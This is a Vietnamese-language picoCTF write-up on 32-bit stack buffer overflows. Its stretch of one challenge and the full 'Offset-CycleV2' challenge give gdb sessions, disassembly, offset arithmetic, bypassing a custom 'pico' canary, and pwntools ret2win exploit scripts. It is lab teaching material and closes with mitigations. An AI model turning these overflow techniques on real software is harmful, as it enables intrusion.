eax            0xffdc51d2          -2338350
```
Và con số **0xffdc51d2** chính là địa chỉ của đầu buffer. Tiếp tục dùng ```info frame``` (i frame) để giá trị và địa chỉ các thanh ghi trong stack
```bash
(gdb) i frame
Stack level 0, frame at 0xffdc5270:
 eip = 0x80492a3 in vuln; saved eip = 0x8049335
 called by frame at 0xffdc52a0
 Arglist at 0xffdc51c0, args:
 Locals at 0xffdc51c0, Previous frame's sp is 0xffdc5270
 Saved registers:
	ebx at 0xffdc5264, ebp at 0xffdc5268, eip at 0xffdc526c
```
Mấy dòng ở trên là giá trị các thanh ghi chứa, ta chỉ quan tâm cái ```eip at 0xffdc526c``` vì đây là đỉnh stack, chứa return address. Sử dụng lệnh ```p 0xffdc526c-0xffdc51d2``` sẽ ra chính xác offset cần tìm:
```bash
(gdb) p 0xffdc526c-0xffdc51d2
$1 = 154
```
### 3. Chiến thuật khai thác
Con số 154 chính xác là cái **rbp-0x96** mà lệnh lea ở chỉ vào + **4 byte** của saved ebp (4 bytes vì đây là kiến trúc **32bit i386**, còn đối với kiến trúc **64 bit** thì save rbp luôn là **8 bytes**) = 154 byte

Như vậy ta thấy địa chỉ buffer cố định trên ```lea ebp-(offset-4)```. Nhưng vì bài này giới hạn thời gian nên chúng ta sẽ sử dụng payload script để tìm ra flag, và tôi cũng sẽ thử lại một phiên mới để nhanh tìm ra offset
#### Payload
Sử dụng python để viết script là lựa chọn tốt nhất, ta hàm thư viện pwn kết hợp các hàm process, sendline và interactive để khai thác
```python
from pwn import *

p.process('./filename')

win = p32(0x80491f6)
payload = b'a'*... + b'b'*4 + win

p.sendline(payload)

p.interactive()
```
Kết quả thu dược:
```bash
ctf-player@pico-chall$ python3 k.py
[+] Starting local process './19': pid 134
[*] Switching to interactive mode
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{}[*] Got EOF while reading in interactive
```
Tự làm để lấy flag đi nhé!
### 4. Kết luận
Lỗ hổng: Sử dụng hàm gets() tại hàm vuln(). Hàm này vô cùng rủi ro vì nó không kiểm tra kích thước dữ liệu so với vùng đệm BUFSIZE

Hậu quả: Ghi đè lên Saved EBP và Saved EIP dễ dàng nếu như không có Canary = ret2win

Giải pháp:
* Sử dụng các hàm khác an toàn hơn như fgets(buf, sizeof(buf), stdin) thay cho gets vì nó lấy theo kích thước buf (sizeof)
* Bật Stack Canaries (-fstack-protector) để phát hiện BOF trước khi hàm trả về [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
* Và một số giải pháp khác tôi chưa học đến

## Offset-CycleV2

**Category:** Binary Exploitation  |
**Point:** 400 |
Difficult: Hard

> It's a race against time. Solve the binary exploit ASAP.
```bash
ssh -p <PORT> ctf-player@green-hill.picoctf.net
# Password: password
```
Bạn cần truy cập thử thách trên pico để mở instance

### 1. Tóm tắt
Bài này được tạo ra với một file thực thi khi chạy tạo ra một file thực thi lấy flag và một file source code của nó. Lỗ hổng Buffer Overflow cho phép nhập input1 là kích thước buffer để input2 nhập dữ liệu rác gây tràn bộ nhớ. Sử dụng kĩ thuật ret2win + đoán canary để tính toán offset để thay return address thành win address và lấy flag trong thời gian có hạn là 80s trước khi hai file bị xóa

Write-up được viết bởi chillfish
### 2. Static Analysing
#### Chạy thử
Bài cho một file start thực thi sẽ tạo ra hai files tên là số ngẫu nhiên:
```bash
ctf-player@pico-chall$ ./start
[+] Selected file: filename.c
[+] Copied filename.c to current directory.
[+] Compilation successful: filename
[+] Binary filename has access to flag.txt
[*] Deletion scheduled: files will be removed in 80 seconds (even if this script exits).
```
Thực thi file binary được tạo, nó yêu cầu nhập hai lần:
```bash
ctf-player@pico-chall$ ./36
How many bytes?
> 100
Input> aaaaaaaaaaaaaaaaaaaaaaaaaa
Ok... Now Where's the flag?
```
#### Phân tích code
<details>
<summary>Đọc source code</summary>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 334
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
		char flag[FLAGSIZE];
		FILE *f = fopen("CodeBank/flag.txt", "r");

		if (!f) {
				puts("Missing flag.txt.");
				exit(0);
		}

		fgets(flag, FLAGSIZE, f);
		puts(flag);
}

void load_canary() {
		FILE *f = fopen("CodeBank/flag.txt", "r");

		if (!f) {
				puts("Missing flag.txt.");
				exit(0);
		}

		fread(global_canary, 1, CANARY_SIZE, f);
		fclose(f);
}

void vuln() {
		char local_canary[CANARY_SIZE];
		char buf[BUFSIZE];
		char input[BUFSIZE];
		int count, i = 0;

		memcpy(local_canary, global_canary, CANARY_SIZE);

		printf("How many bytes?\n> ");
		while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
				i++;

		sscanf(input, "%d", &count);

		printf("Input> ");
		read(0, buf, count);

		if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
				puts("***** Stack Smashing Detected *****");
				exit(0);
		}

		puts("Ok... Now Where's the flag?");
}

int main() {
		setvbuf(stdout, NULL, _IONBF, 0);
		setresgid(getegid(), getegid(), getegid());

		load_canary();
		vuln();
		return 0;
}
```
</details>
Giá trị BUFSIZE sẽ thay đổi ngẫu nhiên sau mỗi phiên start mới

Bỏ qua lệnh gọi thư viện, ta xem xét qua những dòng set kích thước cho Buffer (random) , Canary (không thay đổi) và Flagsize (không thay đổi)
```C
#define BUFSIZE 334
#define CANARY_SIZE 4
#define FLAGSIZE 64
```
Tiếp theo là tạo biến cục bộ global_canary. Sau đó tạo hàm win với việc mở và báo lỗi nếu không có flag, rồi đặt 64bytes kích thước trong file flag.txt vào biến flag và in ra
```C
char global_canary[CANARY_SIZE];

void win() {
		char flag[FLAGSIZE];
		FILE *f = fopen("CodeBank/flag.txt", "r");

		if (!f) {
				puts("Missing flag.txt.");
				exit(0);
		}

		fgets(flag, FLAGSIZE, f);
		puts(flag);
}
```
Đến với một hàm quan trọng là load_canary, bỏ qua đoạn check flag, đến với lệnh ``` fread(global_canary, 1, CANARY_SIZE, f);```, fread sẽ đọc dữ liệu từ nơi chỉ định đến nơi đích theo một kích thước chỉ định [Hiểu thêm về fread](https://www.geeksforgeeks.org/c/fread-function-in-c/).

Như vậy, hàm này sẽ đọc từ biến f(flag) lấy tối đa CANARY_SIZE bytes (4 bytes) vào global_canary, mà flag có 4 bytes đầu là **pico** nên ta có thể dễ dàng đoán được custom canary của bài này là 4 bytes cho chuỗi pico
```C
void load_canary() {
		FILE *f = fopen("CodeBank/flag.txt", "r");

		if (!f) {
				puts("Missing flag.txt.");
				exit(0);
		}

		fread(global_canary, 1, CANARY_SIZE, f);
		fclose(f);
}
```
Tiếp tục đến với hàm vuln, đây là phần tôi tốn nhiều thời gian để đọc hiểu code nhất, hàm này là nơi lỗi sẽ xảy ra, đầu tiên gọi local_canary, buf, input, count và i. Tiếp theo so sánh local_canary và global_canary theo CANARY_SIZE (4) [Hiểu về memcpy](https://www.geeksforgeeks.org/cpp/memcpy-in-cc/) để check canary trước.

Vòng lặp while ở đây nhìn hơi rối nên tôi sẽ tách từng phần ra để phân tích ```while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')```

Đầu tiên là điều kiện: i < BUFSIZE để tránh overflow. tiếp theo lệnh ```read(0, &input[i], 1) == 1``` sử dụng read với tham số đầu là 0 (tức là nhập từ bàn phím) nhập vào mảng tên input ở vị trí i (i ban đầu được cho là 0 và có i++ ở dưới) còn read() == 1 tức là khi hàm này chạy thành công(user nhập input, khi -1 hoặc 0 tức lỗi không nhập hoặc nhập lỗi) [Hiểu thêm về read](https://www.man7.org/linux/man-pages/man2/read.2.html). Điều kiện vòng lặp tiếp tục là ```input[i] != '\n')``` tức khi mảng input[i] gặp enter (hoặc \n từ script) sẽ dừng lại

Sau khi vòng lặp nhập lần một xong, nó sẽ chuyển giá trị trong mảng input qua count bằng lệnh ```sscanf(input, "%d", &count);``` [Hiểu thêm về sscanf](https://www.geeksforgeeks.org/c/how-to-read-data-using-sscanf-in-c/). Sau đó dùng lệnh read để đọc giá trị từ bàn phím (mode 0) vào buf với giới hạn kích thước là count. Lỗi Buffer Overflow xảy ra ở đoạn này, khi mà input thứ nhất được đặt làm giới hạn cho input thứ hai, vậy nếu input thứ nhất đặt một giá trị lớn hơn BUFSIZE được khai báo chẳng phải có thể gây lỗi ghi đè bộ nhớ rồi đúng không, các giá trị lớn ghi đè lên các phân vùng bộ nhớ khác và làm thay đổi giá trị của chúng, đè lên return address để chương trình không thoát ngay mà nhảy đến địa chỉ đó thực thi tiếp đến khi gặp lệnh thoát.

Cuối cùng nó sẽ dùng lệnh memcmp để so sánh canary và thoát chương trình
```C
void vuln() {
		char local_canary[CANARY_SIZE];
		char buf[BUFSIZE];
		char input[BUFSIZE];
		int count, i = 0;

		memcpy(local_canary, global_canary, CANARY_SIZE);

		printf("How many bytes?\n> ");
		while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
				i++;

		sscanf(input, "%d", &count);

		printf("Input> ");
		read(0, buf, count);

		if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
				puts("***** Stack Smashing Detected *****");
				exit(0);
		}

		puts("Ok... Now Where's the flag?");
}
```
Và cuối cùng là hàm main làm một số thao tác set quyền rồi gọi load_canary, vuln rồi exit
```C
int main() {
		setvbuf(stdout, NULL, _IONBF, 0);
		setresgid(getegid(), getegid(), getegid());

		load_canary();
		vuln();
		return 0;
```
#### Check bảo mật
Sử dụng lệnh checksec với file thực thi được tạo để xem mitigation của file
```bash
ctf-player@pico-chall$ checksec 36
[*] '/home/ctf-player/36'
		Arch:       i386-32-little       -> saved rbp và return address chỉ có 4 bytes
		RELRO:      Partial RELRO
		Stack:      No canary found      -> Custom canary
		NX:         NX enabled
		PIE:        No PIE (0x8048000)   -> Không random địa chỉ mỗi phiên chạy -> dễ tính offset
		SHSTK:      Enabled
		IBT:        Enabled
		Stripped:   No
```
Tạm thời ta có thể chắc chắn rằng bài này có canary là 'pico' và sử dụng kiến trúc 32-bit, điều cần thiết nhất bây giờ là địa chỉ của win, offset và vị trí canary trong hệ thống (canary thường đứng trước saved rbp nhưng cũng có thể đặt ở chỗ khác)

### 3. Debugging
Bài này phân tích động là không thể vì việc set quyền của folder CodeBank cho sẵn bị hạn chế, tôi chỉ có thể thực thi file ở ngoài (Dùng ./) nhưng khi dùng gdb để run or start file thì quyền đối với folder đó không được tự do nữa, gặp lỗi Missing flag.txt dù đã set flag giả hay thử mọi cách để chỉnh sửa folder CodeBank
nên những thứ tôi có thể dùng tiếp theo trong gdb chỉ là đọc code assembly và lấy địa chỉ hàm win được thôi

#### p win
Sau khi mở gdb với file, tôi nhanh chóng dùng ```p win``` để xem địa chỉ của hàm và nhận được địa chỉ chính xác là **0x8049316**
```bash
(gdb) p win
$1 = {<text variable, no debug info>} 0x8049316 <win>
```

#### load_canary
Tiếp tục đọc code asm của hàm load_canary bằng lệnh ```disas load_canary``` tôi nhận được code:
```asm
Dump of assembler code for function load_canary:
	 0x08049393 <+0>:     endbr32
	 0x08049397 <+4>:     push   ebp
	 0x08049398 <+5>:     mov    ebp,esp
	 0x0804939a <+7>:     push   ebx
	 0x0804939b <+8>:     sub    esp,0x14
	 0x0804939e <+11>:    call   0x8049250 <__x86.get_pc_thunk.bx>
	 0x080493a3 <+16>:    add    ebx,0x2c5d
	 0x080493a9 <+22>:    sub    esp,0x8
	 0x080493ac <+25>:    lea    eax,[ebx-0x1ff8]
	 0x080493b2 <+31>:    push   eax
	 0x080493b3 <+32>:    lea    eax,[ebx-0x1ff6]
	 0x080493b9 <+38>:    push   eax
	 0x080493ba <+39>:    call   0x80491e0 <fopen@plt>
	 0x080493bf <+44>:    add    esp,0x10
	 0x080493c2 <+47>:    mov    DWORD PTR [ebp-0xc],eax
	 0x080493c5 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
	 0x080493c9 <+54>:    jne    0x80493e7 <load_canary+84>
	 0x080493cb <+56>:    sub    esp,0xc
	 0x080493ce <+59>:    lea    eax,[ebx-0x1fe4]
	 0x080493d4 <+65>:    push   eax
	 0x080493d5 <+66>:    call   0x8049190 <puts@plt>
	 0x080493da <+71>:    add    esp,0x10
	 0x080493dd <+74>:    sub    esp,0xc
	 0x080493e0 <+77>:    push   0x0
	 0x080493e2 <+79>:    call   0x80491a0 <exit@plt>
	 0x080493e7 <+84>:    push   DWORD PTR [ebp-0xc]
	 0x080493ea <+87>:    push   0x4
	 0x080493ec <+89>:    push   0x1
	 0x080493ee <+91>:    mov    eax,0x804c050
	 0x080493f4 <+97>:    push   eax
	 0x080493f5 <+98>:    call   0x8049180 <fread@plt>
	 0x080493fa <+103>:   add    esp,0x10
	 0x080493fd <+106>:   sub    esp,0xc
	 0x08049400 <+109>:   push   DWORD PTR [ebp-0xc]
	 0x08049403 <+112>:   call   0x8049150 <fclose@plt>
	 0x08049408 <+117>:   add    esp,0x10
	 0x0804940b <+120>:   nop
	 0x0804940c <+121>:   mov    ebx,DWORD PTR [ebp-0x4]
	 0x0804940f <+124>:   leave
	 0x08049410 <+125>:   ret
```
vì phần quan trọng của hàm này nằm ở hàm fread nên tôi sẽ chỉ tìm lệnh call hàm đó thôi. Bạn có thấy lệnh ```mov    eax,0x804c050``` chứ, đó là lệnh đặt địa chỉ của global_canary vào eax đó, sau đó khi call fread nó sẽ xử lí các số liệu theo những cái được set up trước đó
```asm
	 0x080493ea <+87>:    push   0x4
	 0x080493ec <+89>:    push   0x1
	 0x080493ee <+91>:    mov    eax,0x804c050
	 0x080493f4 <+97>:    push   eax
	 0x080493f5 <+98>:    call   0x8049180 <fread@plt>
```
#### vuln
Giờ khám vuln nhé, phần này chứa offset và vị trí của canary trong bài
```asm
Dump of assembler code for function vuln:
	 0x08049411 <+0>:     endbr32
	 0x08049415 <+4>:     push   ebp
	 0x08049416 <+5>:     mov    ebp,esp
	 0x08049418 <+7>:     push   ebx
	 0x08049419 <+8>:     sub    esp,0x2b4
	 0x0804941f <+14>:    call   0x8049250 <__x86.get_pc_thunk.bx>
	 0x08049424 <+19>:    add    ebx,0x2bdc
	 0x0804942a <+25>:    mov    DWORD PTR [ebp-0xc],0x0
	 0x08049431 <+32>:    mov    eax,0x804c050
	 0x08049437 <+38>:    mov    eax,DWORD PTR [eax]
	 0x08049439 <+40>:    mov    DWORD PTR [ebp-0x10],eax
	 0x0804943c <+43>:    sub    esp,0xc
	 0x0804943f <+46>:    lea    eax,[ebx-0x1fd2]
	 0x08049445 <+52>:    push   eax
	 0x08049446 <+53>:    call   0x8049130 <printf@plt>
	 0x0804944b <+58>:    add    esp,0x10
	 0x0804944e <+61>:    jmp    0x8049454 <vuln+67>
	 0x08049450 <+63>:    add    DWORD PTR [ebp-0xc],0x1
	 0x08049454 <+67>:    cmp    DWORD PTR [ebp-0xc],0x14d
	 0x0804945b <+74>:    jg     0x804948f <vuln+126>
	 0x0804945d <+76>:    lea    edx,[ebp-0x2ac]
	 0x08049463 <+82>:    mov    eax,DWORD PTR [ebp-0xc]
	 0x08049466 <+85>:    add    eax,edx
	 0x08049468 <+87>:    sub    esp,0x4
	 0x0804946b <+90>:    push   0x1
	 0x0804946d <+92>:    push   eax
	 0x0804946e <+93>:    push   0x0
	 0x08049470 <+95>:    call   0x8049120 <read@plt>
	 0x08049475 <+100>:   add    esp,0x10
	 0x08049478 <+103>:   cmp    eax,0x1
	 0x0804947b <+106>:   jne    0x804948f <vuln+126>
	 0x0804947d <+108>:   lea    edx,[ebp-0x2ac]
	 0x08049483 <+114>:   mov    eax,DWORD PTR [ebp-0xc]
	 0x08049486 <+117>:   add    eax,edx
	 0x08049488 <+119>:   movzx  eax,BYTE PTR [eax]
	 0x0804948b <+122>:   cmp    al,0xa
	 0x0804948d <+124>:   jne    0x8049450 <vuln+63>
	 0x0804948f <+126>:   sub    esp,0x4
	 0x08049492 <+129>:   lea    eax,[ebp-0x2b0]
	 0x08049498 <+135>:   push   eax
	 0x08049499 <+136>:   lea    eax,[ebx-0x1fbf]
	 0x0804949f <+142>:   push   eax
	 0x080494a0 <+143>:   lea    eax,[ebp-0x2ac]
	 0x080494a6 <+149>:   push   eax
	 0x080494a7 <+150>:   call   0x80491c0 <__isoc99_sscanf@plt>
	 0x080494ac <+155>:   add    esp,0x10
	 0x080494af <+158>:   sub    esp,0xc
	 0x080494b2 <+161>:   lea    eax,[ebx-0x1fbc]
	 0x080494b8 <+167>:   push   eax
	 0x080494b9 <+168>:   call   0x8049130 <printf@plt>
	 0x080494be <+173>:   add    esp,0x10
	 0x080494c1 <+176>:   mov    eax,DWORD PTR [ebp-0x2b0]
	 0x080494c7 <+182>:   sub    esp,0x4
	 0x080494ca <+185>:   push   eax
	 0x080494cb <+186>:   lea    eax,[ebp-0x15e]
	 0x080494d1 <+192>:   push   eax
	 0x080494d2 <+193>:   push   0x0
	 0x080494d4 <+195>:   call   0x8049120 <read@plt>
	 0x080494d9 <+200>:   add    esp,0x10
	 0x080494dc <+203>:   sub    esp,0x4
	 0x080494df <+206>:   push   0x4
	 0x080494e1 <+208>:   mov    eax,0x804c050
	 0x080494e7 <+214>:   push   eax
	 0x080494e8 <+215>:   lea    eax,[ebp-0x10]
	 0x080494eb <+218>:   push   eax
	 0x080494ec <+219>:   call   0x8049160 <memcmp@plt>
	 0x080494f1 <+224>:   add    esp,0x10
	 0x080494f4 <+227>:   test   eax,eax
	 0x080494f6 <+229>:   je     0x8049514 <vuln+259>
	 0x080494f8 <+231>:   sub    esp,0xc
	 0x080494fb <+234>:   lea    eax,[ebx-0x1fb4]
	 0x08049501 <+240>:   push   eax
	 0x08049502 <+241>:   call   0x8049190 <puts@plt>
	 0x08049507 <+246>:   add    esp,0x10
	 0x0804950a <+249>:   sub    esp,0xc
	 0x0804950d <+252>:   push   0x0
	 0x0804950f <+254>:   call   0x80491a0 <exit@plt>
	 0x08049514 <+259>:   sub    esp,0xc
	 0x08049517 <+262>:   lea    eax,[ebx-0x1f90]
	 0x0804951d <+268>:   push   eax
	 0x0804951e <+269>:   call   0x8049190 <puts@plt>
	 0x08049523 <+274>:   add    esp,0x10
	 0x08049526 <+277>:   nop
	 0x08049527 <+278>:   mov    ebx,DWORD PTR [ebp-0x4]
	 0x0804952a <+281>:   leave
	 0x0804952b <+282>:   ret
```
Phần mà tôi quan tâm sẽ là phần chứa lệnh ``` memcmp``` và ```read(0, buf, count);``` vì chúng chứa các giá trị cần thiết như buf và canary

Bạn có thấy rằng lệnh lea(lấy địa chỉ từ nơi này đưa cho thằng khác cầm) lấy địa chỉ của **ebp-0x15e** để đặt vào eax không, đây chính là đặt địa chỉ cách đỉnh buffer 0x15e bytes (350 bytes) cách 16bytes đơn vị so với buffer được cấp trong source code (Do cơ chế căn lề của stack để tối ưu hiệu năng và khớp với hệ thống nên nó sẽ add thêm padding 16bytes vào là như vậy)
```asm
	 0x080494c7 <+182>:   sub    esp,0x4
	 0x080494ca <+185>:   push   eax
	 0x080494cb <+186>:   lea    eax,[ebp-0x15e]
	 0x080494d1 <+192>:   push   eax
	 0x080494d2 <+193>:   push   0x0
	 0x080494d4 <+195>:   call   0x8049120 <read@plt>
```
Tiếp theo ngay bên dưới lệnh call read, có lệnh call memcmp, một điều tôi thấy rõ rằng là cía địa chỉ của global canary lại xuất hiện và được set vào eax, như vậy rõ ràng rằng cách hoạt động của memcmp đặt thứ để so sánh là global canary sẽ đặt vào eax, còn thử được so sánh sẽ được giao địa chỉ cho eax sau lệnh push để bảo toàn dữ liệu cũ (push đẩy eax vào stack xếp chồng các giá trị).

```lea    eax,[ebp-0x10]``` nơi sẽ được global canary so sánh, không gì khác là local canary - cái custom canary trong file. Nó được đặt tại **ebp-0x10** (16 bytes)
```asm
	 0x080494d9 <+200>:   add    esp,0x10
	 0x080494dc <+203>:   sub    esp,0x4
	 0x080494df <+206>:   push   0x4
	 0x080494e1 <+208>:   mov    eax,0x804c050
	 0x080494e7 <+214>:   push   eax
	 0x080494e8 <+215>:   lea    eax,[ebp-0x10]
	 0x080494eb <+218>:   push   eax
	 0x080494ec <+219>:   call   0x8049160 <memcmp@plt>
```
#### Tính toán
Khi đã có offset (tới saved ebp) được xác định tại lệnh call read, mà canary (4 bytes) lại từ saved ebp - 12 bytes (vì 4 bytes của canary nên 16-4=12)

[**return address (4 bytes)**] -> [**saved ebp (4 bytes)**]  -> (**12 bytes**) -> [**canary (4 bytes)**] -> **offset(x - 16 bytes )**

### 4. Chiến thuật khai thác
Vì bài này thời gian rất có hạn (80s) nên tôi sẽ cần một thao tác nhanh chính xác kết hợp một payload script để có được flag

* Bước 1: Viết sẵn script, tôi sử dụng python cho tính tiện dụng và hàm pwntools hiệu quả của nó. Script này cho phép tôi chỉ cần sửa filename và offset dạng hex tìm được từ lệnh lea, nó sẽ tự chuyển thành decimal và tự trừ ra offset chuẩn để gửi payload. Tôi cũng kết hợp 12 bytes đến saved ebp và 4 bytes rác của saved ebp lại thành 16 bytes để nhìn gọn nhất. Sau đó dùng các lệnh sendafter để gửi payload
```python
from pwn import *

p = process('./filename')

offset = int('realhexoffset', 16) - int('0x10', 16)
win = p32(0x8049316)
canary = b'pico'
payload = b'a'*offset + canary + b'b'*16 + win

p.sendafter(b'> ', b'1000\n')
p.sendafter(b'Input> ', payload)

p.interactive()
```
* Bước 2: Ngay khi ./start chương trình, tôi sẽ mở gdb -> disas vuln -> tìm lệnh call read và đọc offset -> đọc call memcmp nếu thấy vị trí canary thay đổi thì tính toán nhanh và sửa vào script(đoạn biến offset và sửa lại b'b'*16 - nhưng bài này không random vị trí)
* Bước 3: Chạy script và nhận flag

Kết quả:
```bash
[+] Starting local process './26': pid 52
[*] Switching to interactive mode
Ok... Now Where's the flag?
picoCTF{}
[*] Got EOF while reading in interactive
```
Tự làm đi nhé baby
